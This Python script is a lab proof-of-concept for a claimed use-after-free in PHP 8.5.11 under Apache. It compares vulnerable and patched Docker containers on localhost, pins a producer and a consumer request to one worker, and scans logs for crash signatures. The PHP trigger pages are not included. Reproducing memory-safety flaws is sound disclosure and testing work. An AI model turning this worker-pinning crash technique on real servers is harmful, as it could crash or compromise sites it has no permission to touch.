#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-109619 (Critical: 9.2)
#  Vendor: PHP (The PHP Group)
#  Versions: PHP 8.5.11 apache2handler (fixed in 8.5.12)
#  Impact: Unauth same-worker UAF via fatal backtrace then INI diagnostic
#  Requires: Apache prefork one worker; fatal_error_backtraces; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-109619"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove CVE-2026-109619 stale worker-global UAF on Apache mod_php 8.5.11 vs 8.5.12."""

import http.client
import os
import re
import socket
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "CVE-2026-109619"
WITNESS = "CVE-2026-109619-UAF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109619")
HERE = Path(__file__).resolve().parent

HOST = "127.0.0.1"
VULN_PORT = 18222
PATCHED_PORT = 18223
VULN_IMAGE = "php:8.5.11-apache"
PATCHED_IMAGE = "php:8.5.12-apache"
SAPI = "apache2handler"
HOW = "backtrace"
ROUNDS = 8
TIMEOUT_S = 8.0


@dataclass(frozen=True)
class HttpResult:
    complete: bool
    reset: bool
    timeout: bool
    status: int | None
    body: bytes
    headers: dict[str, str]
    error: str
    pid: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def _header_map(resp: http.client.HTTPResponse) -> dict[str, str]:
    out: dict[str, str] = {}
    for key, value in resp.getheaders():
        out[key.lower()] = value
    return out


def http_get(port: int, path: str, timeout: float = TIMEOUT_S) -> HttpResult:
    body = b""
    headers: dict[str, str] = {}
    status: int | None = None
    try:
        conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
        try:
            conn.request(
                "GET",
                path,
                headers={
                    "Host": HOST,
                    "Connection": "close",
                    "User-Agent": "cve-2026-109619-lab",
                },
            )
            resp = conn.getresponse()
            status = int(resp.status)
            headers = _header_map(resp)
            body = resp.read()
        finally:
            conn.close()
    except TimeoutError:
        return HttpResult(False, False, True, status, body, headers, "timeout", "")
    except socket.timeout:
        return HttpResult(False, False, True, status, body, headers, "timeout", "")
    except (
        ConnectionResetError,
        ConnectionAbortedError,
        BrokenPipeError,
        http.client.RemoteDisconnected,
        http.client.IncompleteRead,
        http.client.BadStatusLine,
    ) as exc:
        return HttpResult(False, True, False, status, body, headers, str(exc), "")
    except OSError as exc:
        err = str(exc).lower()
        reset = any(
            tok in err
            for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
        )
        return HttpResult(False, reset, False, status, body, headers, str(exc), "")
    pid = headers.get("x-worker-pid", "")
    return HttpResult(True, False, False, status, body, headers, "", pid)


def two_phase(port: int, timeout: float = TIMEOUT_S) -> tuple[HttpResult, HttpResult]:
    """Producer then consumer on one HTTP/1.1 connection (same worker)."""
    producer = HttpResult(False, False, False, None, b"", {}, "not-started", "")
    consumer = HttpResult(False, False, False, None, b"", {}, "not-started", "")
    conn: http.client.HTTPConnection | None = None
    try:
        conn = http.client.HTTPConnection(HOST, port, timeout=timeout)
        conn.request(
            "GET",
            "/producer.php",
            headers={
                "Host": HOST,
                "Connection": "keep-alive",
                "User-Agent": "cve-2026-109619-lab",
            },
        )
        resp1 = conn.getresponse()
        body1 = resp1.read()
        headers1 = _header_map(resp1)
        producer = HttpResult(
            True,
            False,
            False,
            int(resp1.status),
            body1,
            headers1,
            "",
            headers1.get("x-worker-pid", ""),
        )
        conn.request(
            "GET",
            "/consumer.php",
            headers={
                "Host": HOST,
                "Connection": "close",
                "User-Agent": "cve-2026-109619-lab",
            },
        )
        resp2 = conn.getresponse()
        body2 = resp2.read()
        headers2 = _header_map(resp2)
        consumer = HttpResult(
            True,
            False,
            False,
            int(resp2.status),
            body2,
            headers2,
            "",
            headers2.get("x-worker-pid", ""),
        )
    except TimeoutError:
        if not producer.complete:
            producer = HttpResult(False, False, True, None, b"", {}, "timeout", "")
        else:
            consumer = HttpResult(False, False, True, None, b"", {}, "timeout", producer.pid)
    except socket.timeout:
        if not producer.complete:
            producer = HttpResult(False, False, True, None, b"", {}, "timeout", "")
        else:
            consumer = HttpResult(False, False, True, None, b"", {}, "timeout", producer.pid)
    except (
        ConnectionResetError,
        ConnectionAbortedError,
        BrokenPipeError,
        http.client.RemoteDisconnected,
        http.client.IncompleteRead,
        http.client.BadStatusLine,
    ) as exc:
        if not producer.complete:
            producer = HttpResult(False, True, False, None, b"", {}, str(exc), "")
        else:
            consumer = HttpResult(
                False, True, False, None, b"", {}, str(exc), producer.pid
            )
    except OSError as exc:
        err = str(exc).lower()
        reset = any(
            tok in err
            for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
        )
        if not producer.complete:
            producer = HttpResult(False, reset, False, None, b"", {}, str(exc), "")
        else:
            consumer = HttpResult(
                False, reset, False, None, b"", {}, str(exc), producer.pid
            )
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass
    return producer, consumer


def body_text(result: HttpResult) -> str:
    return result.body.decode("utf-8", errors="replace")


def summarize(name: str, result: HttpResult) -> None:
    text = body_text(result).replace("\r\n", "\\n").replace("\n", "\\n")
    if len(text) > 220:
        text = text[:220] + "..."
    log(
        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
        f"timeout={int(result.timeout)} status={result.status} pid={result.pid!r} "
        f"error={result.error!r} body={text!r}"
    )


def service_logs(service: str) -> str:
    proc = compose("logs", "--no-color", "--tail", "400", service, timeout=30)
    return (proc.stdout or "") + (proc.stderr or "")


def service_status() -> str:
    proc = compose("ps", "-a", "--format", "{{.Service}} {{.Status}}", timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def crash_needles(blob: str) -> list[str]:
    low = blob.lower()
    found: list[str] = []
    needles = (
        "addresssanitizer",
        "heap-use-after-free",
        "heap-buffer-overflow",
        "use-after-poison",
        "zend_mm_heap corrupted",
        "zend_mm_heap",
        "exit signal segmentation fault",
        "segmentation fault",
        "sigsegv",
        "signal 11",
        "signal 6",
        "signal 4",
        "aborted",
        "fatal signal",
        "core dumped",
        "exit signal",
        "child pid",
        "end of script execution",
    )
    for needle in needles:
        if needle in low:
            found.append(needle)
    return found


def ioc_lines(service: str, logs: str, status: str) -> None:
    log(f"IOC {service}-status {status!r}")
    hits = 0
    for line in logs.splitlines():
        low = line.lower()
        if any(
            tok in low
            for tok in (
                "addresssanitizer",
                "heap-use-after-free",
                "zend_mm",
                "segfault",
                "sigsegv",
                "signal",
                "abort",
                "core dumped",
                "exit signal",
                "child pid",
                "fatal error",
                "deprecated",
                "auto_detect_line_endings",
                "report_memleaks",
            )
        ):
            log(f"IOC {service}-log {line.strip()[:320]}")
            hits += 1
            if hits >= 24:
                break


def producer_ok(result: HttpResult) -> bool:
    if result.reset or result.timeout:
        return False
    text = body_text(result)
    return "Fatal error" in text or (result.status is not None and result.status >= 500)


def consumer_alive(result: HttpResult) -> bool:
    if not result.complete or result.reset or result.timeout:
        return False
    if result.status != 200:
        return False
    return "consumer-ok" in body_text(result)


def consumer_uaf(result: HttpResult, logs: str) -> tuple[bool, str]:
    if consumer_alive(result) and "addresssanitizer" not in logs.lower():
        return False, "consumer-200"
    if result.reset:
        return True, "connection-reset"
    if result.timeout and not result.complete:
        return True, "timeout-incomplete"
    asan = crash_needles(logs)
    asan += crash_needles(body_text(result))
    asan += crash_needles(result.error)
    if any("addresssanitizer" in x or "use-after" in x or "poison" in x for x in asan):
        return True, "asan"
    if any("zend_mm" in x for x in asan):
        return True, "zend-mm-corrupt"
    if any(
        x in asan
        for x in (
            "segmentation fault",
            "sigsegv",
            "signal 11",
            "exit signal segmentation fault",
            "core dumped",
            "fatal signal",
        )
    ):
        return True, "segfault"
    if result.status in (500, 502, 503) and not consumer_alive(result):
        # 500 with PHP fatal is not a UAF; only empty/truncated crash responses count.
        text = body_text(result)
        if not text.strip() or "consumer-ok" not in text:
            if crash_needles(logs):
                return True, "worker-crash"
    if not result.complete and not result.timeout:
        return True, "incomplete"
    return False, "consumer-completed"


def parse_pid(result: HttpResult) -> str:
    if result.pid:
        return result.pid
    match = re.search(r"pid=(\d+)", body_text(result))
    return match.group(1) if match else ""


def ready(port: int) -> HttpResult:
    return http_get(port, "/pid.php")


def main() -> int:
    log(
        f"label={LABEL} vuln={HOST}:{VULN_PORT} patched={HOST}:{PATCHED_PORT} "
        f"images={VULN_IMAGE},{PATCHED_IMAGE} sapi={SAPI} how={HOW} pin=same-worker"
    )

    vuln_ready = ready(VULN_PORT)
    patched_ready = ready(PATCHED_PORT)
    summarize("vuln-ready", vuln_ready)
    summarize("patched-ready", patched_ready)
    if not vuln_ready.complete or "ok" not in body_text(vuln_ready):
        ioc_lines("vuln", service_logs("vuln"), service_status())
        return fail("vuln-not-ready")
    if not patched_ready.complete or "ok" not in body_text(patched_ready):
        ioc_lines("patched", service_logs("patched"), service_status())
        return fail("patched-not-ready")
    if SAPI not in body_text(vuln_ready) or SAPI not in body_text(patched_ready):
        return fail("sapi-mismatch")
    if "8.5.11" not in body_text(vuln_ready):
        return fail("vuln-version-mismatch")
    if "8.5.12" not in body_text(patched_ready):
        return fail("patched-version-mismatch")

    log("== patched two-phase ==")
    patched_prod, patched_cons = two_phase(PATCHED_PORT)
    summarize("patched-producer", patched_prod)
    summarize("patched-consumer", patched_cons)
    if not producer_ok(patched_prod):
        ioc_lines("patched", service_logs("patched"), service_status())
        return fail("patched-producer-failed")
    if not consumer_alive(patched_cons):
        ioc_lines("patched", service_logs("patched"), service_status())
        return fail("patched-consumer-crashed")
    patched_after = ready(PATCHED_PORT)
    summarize("patched-after", patched_after)
    if not patched_after.complete or "ok" not in body_text(patched_after):
        return fail("patched-not-ok")

    log("== vuln two-phase ==")
    vuln_uaf = False
    vuln_how = "none"
    last_prod = HttpResult(False, False, False, None, b"", {}, "none", "")
    last_cons = HttpResult(False, False, False, None, b"", {}, "none", "")
    for round_i in range(1, ROUNDS + 1):
        last_prod, last_cons = two_phase(VULN_PORT)
        summarize(f"vuln-producer-{round_i}", last_prod)
        summarize(f"vuln-consumer-{round_i}", last_cons)
        logs = service_logs("vuln")
        hit, how = consumer_uaf(last_cons, logs)
        log(f"vuln-round={round_i} uaf={int(hit)} how={how}")
        if hit:
            vuln_uaf = True
            vuln_how = how
            break
        if not producer_ok(last_prod):
            # Producer itself reset: still a same-worker crash after publishing state.
            if last_prod.reset or last_prod.timeout:
                vuln_uaf = True
                vuln_how = "producer-crash"
                break
        time.sleep(0.2)

    logs = service_logs("vuln")
    status = service_status()
    ioc_lines("vuln", logs, status)
    ioc_lines("patched", service_logs("patched"), status)

    if not producer_ok(last_prod) and not vuln_uaf:
        return fail("vuln-producer-failed")
    if not vuln_uaf:
        return fail("vuln-no-uaf")
    if not consumer_alive(patched_cons):
        return fail("patched-not-ok")

    log(
        f"SUCCESS {LABEL} vuln-uaf=yes vuln-crash=yes patched-ok=yes "
        f"sapi={SAPI} pin=same-worker vuln-image={VULN_IMAGE} "
        f"patched-image={PATCHED_IMAGE} how={HOW} crash={vuln_how} "
        f"{WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())


